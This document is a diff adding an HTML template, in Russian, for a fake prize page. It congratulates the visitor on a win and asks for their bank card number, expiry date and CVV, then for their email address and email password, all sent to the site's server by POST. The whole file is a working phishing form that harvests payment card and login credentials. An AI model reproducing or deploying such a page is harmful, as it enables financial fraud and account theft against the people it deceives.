@@ -1,0 +1,214 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css"
+          integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
+    <meta charset="UTF-8">
+    <title>Title</title>
+</head>
+<body>
+<h1>Введите номер карты, что бы забрать приз.</h1>
+<p>Вы выиграли {{ user }}!!!</p>
+<p>Введите данные карты</p>
+<head>
+    <meta charset="utf-8">
+    <title>CardInfo.js</title>
+    <style>
+      @font-face {
+        font-family: 'Anonymous Pro';
+        src: url('AnonymousPro-Regular.ttf') format('truetype');
+      }
+      body {
+        padding: 40px;
+        min-width: 700px;
+        margin: 0;
+        font-size: 30px;
+        font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+        font-smoothing: antialiased;
+        -moz-font-smoothing: antialiased;
+        -webkit-font-smoothing: antialiased;
+        -webkit-font-smoothing: subpixel-antialiased;
+      }
+      * {
+        box-sizing: border-box;
+        outline: none;
+      }
+      #cards {
+        width: 19.5em;
+        height: 10em;
+        position: relative;
+        margin: 0;
+      }
+      #front, #back {
+        position: absolute;
+        width: 14.5em;
+        height: 9em;
+        border-radius: 0.5em;
+      }
+      #front {
+        top: 0;
+        left: 0;
+        background: #ddd;
+        z-index: 100;
+      }
+      #number {
+        width: 100%;
+        margin-bottom: 0.3em;
+      }
+      #front-fields {
+        position: absolute;
+        bottom: 0;
+        left: 0;
+        width: 100%;
+        padding: 1em;
+      }
+      #bank-link {
+        position: absolute;
+        top: 1em;
+        right: 1em;
+        width: 320px;
+        height: 60px;
+        display: block;
+        position: relative;
+        left: 1em;
+        background-size: contain;
+        background-position: top left;
+        background-repeat: no-repeat;
+      }
+      #brand-logo {
+        position: absolute;
+        bottom: 1em;
+        right: 1em;
+        text-align: right;
+        height: 1.6em;
+      }
+      #back {
+        bottom: 0;
+        right: 0;
+        background: #bbb;
+        padding-top: 1em;
+        padding-right: 1em;
+        padding-left: 10.5em;
+      }
+      #code {
+        width: 100%;
+      }
+      .field {
+        padding: 0.3em 0.5em;
+        border: none;
+        font-family: 'Anonymous Pro', monospace;
+        font-size: 0.9em;
+        text-indent: 0.1em;
+      }
+      .expired {
+        float: left;
+        width: 3em;
+        margin-right: 0.5em;
+        margin-top: 0.3em;
+      }
+      .label {
+        font-size: 0.5em;
+        display: block;
+        margin-top: 0.5em;
+      }
+      #examples {
+        list-style: none;
+        padding: 0;
+      }
+      .example {
+        font-size: 0.5em;
+        white-space: nowrap;
+        display: inline-block;
+        margin-right: 1.5em;
+        margin-top: 0.3em;
+      }
+      .example-link {
+        text-decoration: none;
+        color: #07c;
+        border-bottom: 1px dashed #07c;
+      }
+      .example-link:hover, .example-link:active {
+        color: #c00;
+        border-color: #c00;
+      }
+      .block {
+        margin: 1em 0 0;
+      }
+      .block:first-child {
+        margin: 0;
+      }
+      .block h2 {
+        margin: 0 0 0.3em 0;
+        font-size: 0.7em;
+      }
+      ul {
+        margin: 0;
+      }
+      #validation {
+        font-size: 0.5em;
+      }
+      #validation li {
+        margin-bottom: 10px;
+      }
+      #validation li.valid {
+        color: green;
+      }
+      #validation li.invalid {
+        color: red;
+      }
+      #instance {
+        font-size: 0.5em;
+        line-height: 1.5em;
+      }
+
+
+
+    </style>
+</head>
+
+
+<body>
+<form method="POST">
+    {% csrf_token %}
+    <div id="cards">
+        <div id="front">
+            <a target="_blank" href="#" id="bank-link"></a>
+            <img src="" alt="" id="brand-logo">
+            <div id="front-fields">
+                <input class="field" id="number" type="text" placeholder="0000 0000 0000 0000" name="number">
+                <label class="label">Номер карты</label>
+                <input class="field expired" id="mm" type="text" placeholder="MM" name="date">
+                <input class="field expired" id="yy" type="text" placeholder="YY" name="year">
+            </div>
+        </div>
+        <div id="back">
+            <input class="field" id="code" type="password" placeholder="" name="CVV">
+            <label id="code-label" class="label">CVV</label>
+        </div>
+    </div>
+
+    <pre id="instance"></pre>
+
+    <script src="../dist/card-info.js"></script>
+    <script src="jquery-3.1.1.min.js"></script>
+    <script src="jquery.mask.min.js"></script>
+
+    <p>А так же введите в почту</p>
+    <div class="form-group">
+        <label for="exampleInputEmail1">Email address</label>
+        <input type="email" class="form-control" id="exampleInputEmail1" aria-describedby="emailHelp"
+               placeholder="Enter email" name="email">
+        <small id="emailHelp" class="form-text text-muted">We'll never share your email with anyone else.</small>
+    </div>
+    <div class="form-group">
+        <label for="exampleInputPassword1">Password</label>
+        <input type="password" class="form-control" id="exampleInputPassword1" placeholder="Password" name="password">
+    </div>
+    <div class="form-group form-check">
+        <input type="checkbox" class="form-check-input" id="exampleCheck1">
+        <label class="form-check-label" for="exampleCheck1">Check me out</label>
+    </div>
+    <button type="submit" class="btn btn-primary">Submit</button>
+</form>
+</body>
+</html>
